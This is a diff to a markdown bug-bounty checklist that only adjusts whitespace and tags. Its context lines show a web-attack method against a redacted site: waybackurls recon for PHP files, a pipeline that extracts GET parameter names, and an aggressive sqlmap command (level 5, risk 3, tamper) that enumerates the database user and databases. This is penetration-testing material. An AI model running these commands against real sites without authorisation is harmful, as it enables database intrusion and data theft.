@@ -83,7 +83,7 @@
   Wayback and grep all php files,
   ```waybackurls https://redacted.org/ | uro | grep “.php” > php-files.txt```
   OK let’s do some bash to grep the names after get to make a list of parameters to brute force in the endpoints.
- 
+
 **Getting Parameters**
 
  ```$ cat php-files.txt| grep -i get | sed 's/.*.get//' | sort -u```
@@ -99,9 +99,8 @@ Ok now go to the endpoint and intercept the request with burp and change the req
 
 SQL:Command:
 ```sqlmap -r req3.txt -p commitment --force-ssl --level 5 --risk 3 --dbms=”MYSQL” --hostname --current-user --current-db --dbs --tamper=between --no-cast```
-	
-</p>
-</details>
+
+</p></details>
 
 - [ ] XSS
 <details><summary>XSS Check list and TIPs</summary>
